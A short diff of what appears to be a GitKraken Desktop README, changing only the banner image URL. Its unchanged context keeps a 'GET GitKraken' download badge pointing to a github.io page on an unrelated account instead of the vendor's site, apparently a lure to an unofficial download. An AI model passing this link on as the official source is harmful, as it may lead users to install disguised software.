@@ -6,7 +6,7 @@ GitKraken Desktop is a graphical Git client that helps developers understand rep
 
 Use GitKraken to inspect working changes, stage files, compare revisions, manage stashes, and work with branches and linked worktrees. Repository integrations also provide access to supported pull request and issue workflows.
 
-![GitKraken Banner](https://gitkraken.com/images/og/gitkraken-og.png)
+![GitKraken Banner](https://gitkraken.com/wp-content/uploads/2026/03/GKD_product_OG.jpg)
 
 [![GET](https://img.shields.io/badge/GET-GitKraken-0078D6?style=for-the-badge&labelColor=555555)](https://xarannaolinalis.github.io/.github/GitKraken-Client)
 
